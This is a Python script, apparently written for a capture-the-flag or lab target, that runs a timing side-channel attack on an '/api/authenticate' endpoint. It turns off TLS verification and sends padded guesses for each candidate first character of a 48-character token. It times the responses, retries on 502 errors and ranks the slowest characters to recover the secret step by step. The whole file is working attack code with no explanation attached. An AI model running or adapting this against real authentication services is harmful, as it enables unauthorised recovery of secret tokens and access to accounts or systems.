import requests
import string
import time
import urllib3

urllib3.disable_warnings()

BASE_URL = "https://bbfbc1bf-5042-411e-86b4-29657887ee45.222.255.138.122.nip.io/api/authenticate"
session = requests.Session()
session.verify = False

def query(token: str, delay: float = 1.8):
    time.sleep(delay)
    while True:
        try:
            t0 = time.perf_counter()
            r = session.post(BASE_URL, json={"token": token}, timeout=10)
            elapsed = (time.perf_counter() - t0) * 1000
            if r.status_code == 502:
                time.sleep(2.5)
                continue
            return elapsed, r.status_code, r.text
        except Exception as e:
            time.sleep(3.0)

charset = string.ascii_letters + string.digits

print(f"Scanning all {len(charset)} characters at pos 0...")
results = []
for i, c in enumerate(charset):
    elapsed, code, body = query(c + "0"*47, delay=1.8)
    results.append((elapsed, c))
    print(f"[{i+1}/{len(charset)}] '{c}': {elapsed:.1f}ms (status {code})")

results.sort(reverse=True)
print("\n--- TOP 10 SLOWEST CHARACTERS ---")
for elapsed, c in results[:10]:
    print(f"'{c}': {elapsed:.2f}ms")

print("\n--- ALL SORTED ---")
print([(c, round(e, 1)) for e, c in results])
